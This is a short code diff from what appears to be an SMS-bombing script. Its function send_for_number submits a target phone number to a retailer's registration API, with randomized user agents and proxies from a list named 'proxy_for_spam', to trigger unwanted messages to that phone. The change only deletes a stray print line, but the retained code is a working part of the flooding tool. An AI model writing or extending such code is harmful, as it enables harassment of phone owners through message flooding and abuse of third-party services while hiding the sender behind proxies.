@@ -373,7 +373,6 @@ def send_for_number(phone):
 	try:
 		requests.post('https://goldapple.ru/rest/V1/customer/registration/start', json = {"country_code":"RU","phone":phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
-	print('+')
 	except:
 	    print('-')
 	try:
